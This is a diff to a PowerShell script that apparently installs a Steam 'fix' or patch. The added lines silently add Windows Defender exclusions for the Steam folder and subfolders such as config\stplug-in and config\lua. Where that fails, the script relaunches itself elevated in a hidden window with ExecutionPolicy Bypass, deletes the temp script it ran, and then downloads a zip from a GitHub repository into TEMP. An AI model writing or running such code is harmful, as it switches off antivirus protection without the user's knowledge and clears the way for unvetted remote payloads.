@@ -76,6 +76,18 @@ try {
         if (-not $steamRoot) { try { $steamRoot = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath } catch {} }
         if (-not $steamRoot) { $steamRoot = "$env:ProgramFiles(x86)\Steam"; if (-not (Test-Path (Join-Path $steamRoot "steam.exe"))) { $steamRoot = "C:\Program Files (x86)\Steamm" } }
         if ($steamRoot -and (Test-Path (Join-Path $steamRoot "steam.exe"))) {
+            try {
+                Add-MpPreference -ExclusionPath $steamRoot -Force -ErrorAction Stop
+                foreach ($sub in @("steamapps\downloading","steamapps\common","config\stplug-in","config\lua","config\depotcache")) { $pp=Join-Path $steamRoot $sub; if (Test-Path $pp) { Add-MpPreference -ExclusionPath $pp -Force -ErrorAction SilentlyContinue } }
+            } catch {
+                $steamEsc = $steamRoot -replace "'","''"
+                $exCmd = "Add-MpPreference -ExclusionPath '$steamEsc' -Force; foreach (`$s in @('steamapps\downloading','steamapps\common','config\stplug-in','config\lua','config\depotcache')) { `$pp=Join-Path '$steamEsc' `$s; if (Test-Path `$pp) { Add-MpPreference -ExclusionPath `$pp -Force } }"
+                $exFile = Join-Path $env:TEMP "bsa_steam_excl_$([guid]::NewGuid().ToString('N')).ps1"
+                Set-Content -LiteralPath $exFile -Value $exCmd -Encoding UTF8
+                $ep2 = Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$exFile`"") -PassThru
+                $ep2.WaitForExit(15000) | Out-Null
+                Remove-Item -LiteralPath $exFile -Force -ErrorAction SilentlyContinue
+            }
             $wc = New-Object System.Net.WebClient
             $data = $wc.DownloadData("https://github.com/bastisayes/Fixes-steam/raw/main/PARCHENEWw.zip")
             $tmpZip = Join-Path $env:TEMP "patch_$(Get-Random).zip"
